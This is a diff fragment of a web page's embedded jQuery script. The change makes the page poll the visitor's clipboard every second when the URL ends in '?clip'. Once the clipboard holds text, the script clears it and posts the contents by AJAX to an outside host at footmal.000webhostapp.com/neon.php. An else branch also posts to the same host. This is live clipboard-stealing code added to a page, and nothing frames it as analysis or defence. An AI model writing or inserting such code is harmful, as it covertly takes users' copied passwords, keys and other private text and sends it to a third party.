@@ -72,12 +72,12 @@
     <script>
     var t, id;
         $(document).ready(function(){
-          $("iframe").click(function(){
-          alert();
-          });
           if(document.location.search == "?clip"){
-            $("#home").click(function(){
+            var set = setInterval(function(){
           navigator.clipboard.readText().then(text => {
+            if(text != ""){
+              clearInterval(set);
+              navigator.clipboard.writeText("");
     $.ajax({
       url: "https://footmal.000webhostapp.com/neon.php",
       type: "post",
@@ -88,8 +88,9 @@
       document.location.href = document.location.href;
       }
     });
+            }
           });
-            });
+            }, 1000);
           } else {
           $.ajax({
       url: "https://footmal.000webhostapp.com/neon.php",
